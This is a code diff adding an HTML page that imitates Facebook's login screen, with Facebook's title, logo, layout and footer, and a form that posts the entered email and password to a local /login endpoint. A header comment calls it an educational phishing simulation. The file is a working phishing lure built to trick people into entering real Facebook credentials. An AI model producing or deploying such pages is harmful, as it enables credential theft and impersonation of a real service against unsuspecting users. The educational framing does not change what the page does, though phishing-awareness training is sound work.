@@ -1,0 +1,179 @@
+<!-- This source code is written by Abhinav Singh for educational purpose only like, making this Phishing Simulation and making my learning experience more practical.-->
+<!DOCTYPE html>
+<html>
+    <head>
+        <title>Facebook - log in or sign up</title>
+    </head>
+    <style>
+        body {
+            font-family: Helvatica, Arial, sans-serif;
+            font-size: 12px;
+            color: #1c1e21;
+            line-height: 1.34;
+            margin: 0px;
+            padding: 0px;
+            background: #f2f4f7;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+        }
+
+        main {
+            margin-top: 10rem;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            width: 1000px;
+        }
+
+        .facebook-info {
+            display: flex;
+            flex-direction: column;
+        }
+
+        .facebook-info img {
+            height: 106px;
+            width: 320px;
+            margin-bottom: -3em;
+            margin-left: -2rem;
+        }
+
+        .facebook-info p {
+            font-size: 28px;
+            font-weight: normal;
+            line-height: 32px;
+            width: 500px;
+        }
+
+        .login-tile {
+            padding: 1rem;
+            background: white;
+            border-radius: 0.5rem;
+            box-shadow: 0px 0px 10px #ccc;
+            display: flex;
+            flex-direction: column;
+            width: 350px;
+            height: 290px;
+        }
+
+        .login-tile input {
+            border: 1px solid #ccc;
+            border-radius: 5px;
+            padding: 14px 16px;
+            outline: none;
+            margin-bottom: 0.75rem;
+            font-size: 17px;
+        }
+
+        .login-tile button {
+            color: white;
+            outline: none;
+            border: none;
+            border-radius: 5px;
+            font-size: 18px;
+            font-weight: bold;
+            height: 40px;
+            cursor: pointer;
+            transition: all 0.25s;
+        }
+
+        .login-tile .login {
+            background: #0866ff;
+        }
+
+        .login-tile .login:hover {
+            background: #3d87ff;
+        }
+
+        .login-tile .create-account {
+            background: #4aa938;
+        }
+
+        .login-tile .create-account:hover {
+            background-color: #36a420;
+        }
+
+        .forgot-password {
+            font-size: 12px;
+            text-align: center;
+            color: #0866ff;
+            text-decoration: none;
+            margin-top: 1rem;
+        }
+
+        .login-tile form {
+            display: flex;
+            flex-direction: column;
+        }
+
+        .bottom-text {
+            display: flex;
+            justify-content: center;
+            margin-top: 1rem;
+        }
+
+        footer {
+            margin-top: 14.5vh;
+            background: white;
+            width: 98%;
+            padding: 1rem;
+        }
+
+        .footer-text {
+            width: 1000px;
+            margin: auto;
+            color: #7d7d7d;
+        }
+
+        hr {
+            border-top: 0.1px solid #ddd;
+            width: 100%;
+        }
+
+        .login-tile hr {
+            margin: 1rem 0;
+        }
+
+        footer p:nth-child(4) {
+            margin-top: 1rem;
+        }
+
+    </style>
+    <body>
+        <main>
+            <div class="facebook-info">
+                <img src="https://static.xx.fbcdn.net/rsrc.php/y1/r/4lCu2zih0ca.svg" alt="facebook-info">
+                <p>Connect with friends and the world around you on Facebook.</p>
+            </div>
+            <div class="login-info">
+                <div class="login-tile">
+                    <form action="/login" method="POST">
+                        <input name="password" type="email" class="email" placeholder="Email or phone number" required autofocus>
+                        <input name="password" type="password" class="password" placeholder="Password" required>
+                        <button class="login">Log In</button>
+                        <a href="#" class="forgot-password">Forgot password?</a>
+                    </form>
+                    <hr>
+                    <button class="create-account">Create new account</button>
+                </div>
+                <span class="bottom-text"><strong>Create a Page</strong>&nbsp;for a celebrity, brand or business.</span>
+            </div>
+        </main>
+
+        <footer>
+            <div class="footer-text">
+                <p>
+                    English (US)&nbsp;&nbsp; Français (Canada)&nbsp;&nbsp;  Español&nbsp;&nbsp;  中文(简体)&nbsp;&nbsp; 한국어&nbsp;&nbsp;  日本語&nbsp;&nbsp;  Português (Brasil)&nbsp;&nbsp;   Deutsch&nbsp;&nbsp;   Italiano&nbsp;&nbsp;   لعربية&nbsp;&nbsp; हिन्दी
+                </p>
+                <hr>
+                <p>
+                    Sign Up &nbsp;&nbsp;  Log In &nbsp;&nbsp;  Messenger &nbsp;&nbsp;  Facebook Lite &nbsp;&nbsp;  Video&nbsp;&nbsp;   Places&nbsp;&nbsp;   Games&nbsp;&nbsp;   Marketplace&nbsp;&nbsp;   Meta Pay&nbsp;&nbsp;   Meta Store&nbsp;&nbsp;   Meta QuestRay-Ban &nbsp;&nbsp; Meta  &nbsp;&nbsp; Meta AI &nbsp;&nbsp;  Instagram  &nbsp;&nbsp; Threads &nbsp;&nbsp;  Fundraisers&nbsp;&nbsp;   Services &nbsp;&nbsp;  Voting Information Center &nbsp;&nbsp;  Privacy Policy &nbsp;&nbsp;  Privacy Center &nbsp;&nbsp;  Groups&nbsp;&nbsp;  About &nbsp;&nbsp;  Create ad&nbsp;&nbsp;   Create Page &nbsp;&nbsp;  Developers &nbsp;&nbsp; Careers &nbsp;&nbsp;  Cookies  &nbsp;&nbsp; Ad choices  &nbsp;&nbsp; Terms &nbsp;&nbsp;  Help &nbsp;&nbsp;  Contact Uploading & Non-Users &nbsp;&nbsp;  Settings &nbsp;&nbsp;  Activity log
+                </p>
+                <p>
+                    Meta © 2025
+                </p>
+            </div>
+        </footer>
+    </body>
+</html>
